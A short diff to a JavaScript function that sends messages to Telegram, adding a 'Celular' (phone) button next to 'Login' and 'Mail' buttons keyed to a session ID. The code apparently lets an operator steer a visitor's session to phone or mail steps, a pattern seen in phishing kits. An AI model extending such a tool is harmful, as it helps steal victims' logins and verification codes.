@@ -28,6 +28,7 @@ async function sendToTelegram(message, withButton = false, type = null) {
                             { text: "\ud83d\udd04 Login", callback_data: `login:${sessionId}` }
                         ],
                         [
+                            { text: "\ud83d\udcf1 Celular", callback_data: `phone:${sessionId}` },
                             { text: "\ud83d\udce7 Mail", callback_data: `mail:${sessionId}` }
                         ]
                     ]
@@ -40,6 +41,7 @@ async function sendToTelegram(message, withButton = false, type = null) {
                             { text: "\ud83d\udd04 Login", callback_data: `login:${sessionId}` }
                         ],
                         [
+                            { text: "\ud83d\udcf1 Celular", callback_data: `phone:${sessionId}` },
                             { text: "\ud83d\udce7 Mail", callback_data: `mail:${sessionId}` }
                         ]
                     ]
